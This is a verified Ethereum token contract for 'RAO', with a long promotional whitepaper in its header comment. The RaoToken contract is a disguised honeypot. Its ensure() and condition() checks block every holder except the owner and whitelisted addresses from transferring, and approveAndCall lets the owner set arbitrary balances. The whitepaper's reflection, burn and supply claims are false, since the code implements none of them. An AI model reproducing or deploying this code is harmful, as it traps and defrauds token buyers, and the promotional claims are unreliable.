/**
 *Submitted for verification at Etherscan.io on 2021-04-12
*/

/*
community owned and operated Oracle.
A trustless feed of prices and off-chain data powering the 3.0.
Unstoppable, all-seeing.
Our revolutionary ReflectEthereum blockchain service is designed to earn extra tokens by simply holding, without any token inflation, secure digital assets and access to funding all over the world. Just hold tokens in your wallet and watch your balance increase.
Why a Reflect Token?
We believe in a new world, which helps people to grow, and protects them from the effects of inflation, or major historic events with detrimental effects such as Covid-19. As an expert's team of developers, we designed a useful deflationist token, and a system of fees applied to each transaction, which fees are instantly split among all the token's holders. We believe that we can succeed together in protecting holders against market variations, variations in costs of living and inflation.
(Data feeds)
Our feeds come from external nodes that are staking $RAO.
If they are good to the RAO, they get a reward.
Or else, they're punished.

Real World Data
RAO asks its external nodes to capture data, such as ETH  price feeds and offchain market prices
RAO Network
Data is pulled in through external nodes, then validated for it's timeliness and accuracy.
Market Data Feeds
RAO pipes out accurate and timely data feeds ready for consumption.
Real World Usage
DEXs, prediction markets, insurance, lending and more then use our feeds to power their dApps.

Abstract 
A cryptocurrency (or crypto currency is a digital asset designed to work as a medium of exchange that uses cryptography to secure its transactions, to control the creation of additional units, and to verify the transfer of assets. Cryptocurrency mainly uses decentralized control with all transactions recorded in a database called Blockchain. The first decentralized cryptocurrency created was Bitcoin in 2009. Since then, the crypto world has grown exponentially. Massive adoption of blockchain technology cannot be avoided in the coming years as cryptocurrency is becoming increasingly easier to access and own. There are at least 1500 cryptocurrencies currently in the market. One of these is Ethereum Block Chain. Ethereum Block Chain implemented a platform that runs a Block-contract, which is a application that runs on blockchain. RAO Protocol is a project of RAO Team that has been researched and designed, and has developed a reference implementation of a self-sustained, self-governed, self-funded blockchain ecosystem. It also implementation of experimental protocols, which are a combination of core features implemented in Block-contracts and merged protocol-level configuration like NFT. An important point is the ability to implement key platform features using built-in mechanisms, i.e. Block-contracts. RAO aims to define and standardize protocols for a reference implementation of built-in reflect staking, governance system and a development funding mechanism based upon Block-contracts. 
Legal Disclaimer
 The information provided on this website does not constitute investment advice, financial advice, trading advice, or any other sort of advice and you should not treat any of the website’s content as such. The RAO (RAO) team does not recommend that any cryptocurrency should be bought, sold, or held by you. Do conduct your own due diligence and consult your financial advisor before making any investment decisions. By purchasing RAO (RAO), you agree that you are not purchasing a security or investment and you agree to hold the team harmless and not liable for any losses or taxes you may incur. You also agree that the team is presenting the token ”as is” and is not required to provide any support or services. You should have no expectation of any form from RAO and its team. Although RAO is an EXPERIMENTAL token for social experiment and not a digital currency, the team strongly recommends that United States persons do not purchase it because the team cannot ensure compliance with United states regulations.
Always make sure that you are in compliance with your local laws and regulations before you make any purchase.
 Risk Disclosure
 Please note there are always risks associated with Block-contracts. Please use at your own risk. RAO (RAO) Token is not a registered broker, analyst or investment advisor. Everything that we provide on this site is purely for guidance, informational and educational purposes. All information contained herein should be independently verified and confirmed. We do not accept any liability for any loss or damage whatsoever caused in reliance upon such information or services. Please be aware of the risks involved with any trading done in any financial market. Do not trade with money that you cannot afford to lose. When in doubt, you should consult a qualified financial advisor before making any investment decisions. 
Introducing RAO Protocol 
RAO is the first ERC20 token to re-imagine the concept of frictionless yield generation and deflationary mechanisms protocol to invest in fractional and frictionless real estate investing. Our revolutionary Reflect Ethereum Block blockchain service is designed to earn extra tokens by simply holding, without any token inflation, secure digital assets and access to funding all over the world. Just hold tokens in your wallet and watch your balance increase. 
Why a reflect token ?

We believe in a new world, which helps people to grow, and protects them from the effects of inflation, or major historic events with detrimental effects such as Covid-19. As an expert’s team of developers, we designed a useful deflationist token, and a system of fees applied to each transaction, which fees are instantly split among all the token’s holders. We believe that we can succeed together in protecting holders against market variations, variations in costs of living and inflation. In light of the uncertainties generated by the Covid-19 crisis, as well as the rising challenges of obtaining real estate loans in this context, our development team resolved to provide a sustainable solution over time, able to hedge against inflation. Our Community is the backbone of the RAO platform. We take pride in its diversity, the Community being made of holders, developers, people passionate about the technology and other amazing people. Join us on Telegram and Twitter and share with friends! RAO is the first ERC20 token to re-imagine the concept of frictionless yield generation and deflationary mechanisms and the first European protocol to invest in fractional and frictionless investing. 
1 The Problem
 Faced with the uncertainty of the coronavirus 2019 crisis. Faced with the complexity and difficulty of obtaining real estate loans in times of crisis. We have decided with our development team of two engineers to provide a sustainable solution over time in the face of inflation. First we decided to create a crypto currency that rewards investors and is deflationary over time. In a second step we want to set up Blocks contract during the second half of 2022 to allow our investors to stack their token even more and give rewards. Problem of fees on the Ethereum Blockchain: Most of the current DeFi projects have been built on the Ethereum Blockchain, increasing the power of the network effects and enhancing the security of the protocol. Although, this has also led to the appeciation of the ETH price which has skyrocketed Ethereum transaction fees. The result is that the Ethereum Ecosystem is becoming a pay-to-win network mostly accessible by the wealthiest wallets. 
2 The Solution
 Cryptocurrency is still the best investment you can make. For the first time, investors around the globe can buy a reflect token through fully-compliant, fractional, tokenized ownership. Powered by blockchain. Our solution allows access to yields and rewards. Through our community we will be able to continue to invest together. We wish to democratize the access to cryptocurrency investment.
3 How do we want to implement this? We are currently a development team looking for long-term investors to support the growth of the project. We started by creating the first version of our protocol. We are working in an agile (like a lean startup) with sprints, way to scale our project. In the long term we want to offer the best user experience on our platform various tangible assets such as land in order to fight against inflation and poverty. We believe that together we can be stronger, that’s why we want to set up rewards to the most loyal holders. We will first create a web platform to allow our community to invest in RAO. To do so, we will give the possibility to token owners to store their tokens in Blocks contracts. A Block contract by tangible assets. The maximum supply of RAO is 10,000, which is continuously burned by 25% of the current fee applied to each transaction. RAO works by applying a 1-10% fee to each transaction and instantly splitting that fee among all holders of the token. Holders do not need to stake or wait for fees to be delivered. Fees are awarded by the Block contract and are immediately reflected in the holders balance. Because of this, 75% of the fees generated go to holders of the token. The percentage of fees you earn is calculated by the percentage of RAO that you own among holders. This generates a much higher yield than would be possible otherwise. The another 25% of the fees are burnt. In most DeFi applications, users must stake or park their tokens in a contract to earn a yield. RAO holders may use their tokens in third party lending, yield farming, or any other Block contract in addition to earning yield from the transaction fees. To facilitate this, the RAO Block contract exposes some new methods that allow staking contracts to easily determine the fees earned by each holder for any period of time even when funds are pooled together. All the information is available on Telegram for all holders. The RAO Block contract is complete at launch and uploaded on ERC20scan. There was no ICO, no pre-sale, and no fundraising of any kind. 
The RAO Community 
Our community is the basis for the RAO platform. We have holders, developers, marketers and all in all amazing people. Join our Telegram channel. And don’t forget to share.
 Initial Launch Stage 
At the first launch of the RAO Protocol, there will be no treasury. The purpose of this is to establish an official team and depend raise funds. The RAO development team will receive the full amount of the treasury fee at this stage of progress. 10% of the initial treasury funding is allocated to the RAO team to finalize the defined goal. 10% of the initial payment for the treasury will be held by the RAO team.
 The total treasury fee at this stage is 20% which includes: 
• Development funding: 10%.
 • Developer allocation: 10% The RAO development team adheres to a policy of complete financial transparency. Funding distribution will be as follows during the initial launch period: 
The first investors who participated in raising the first funds and capital paid their RAO at market price. We made sure to distribute the tokens fairly for each founding member so that they could not hold more than 2.5M tokens at the start of the project. Both to reward them for the risk they took in investing in a new project but also to keep it fair for the investors of the pool. The rest of the tokens were deposited in liquidity pools, exchanges or burned. 
Goals 
The primary goal of RAO is to enhance the value of a token into crypto industry and Block-contract development platforms. Another goal of RAO, Protocol is to boost the growth and adoption of NFT as a community, and as a platform. Therefore, we have the following important goals: • Create a ”deflationist” reflect token. 
• Create an NFT platform on Ethereum Block Chain. 
• Create a marketplace of NFT.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract RaoToken {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}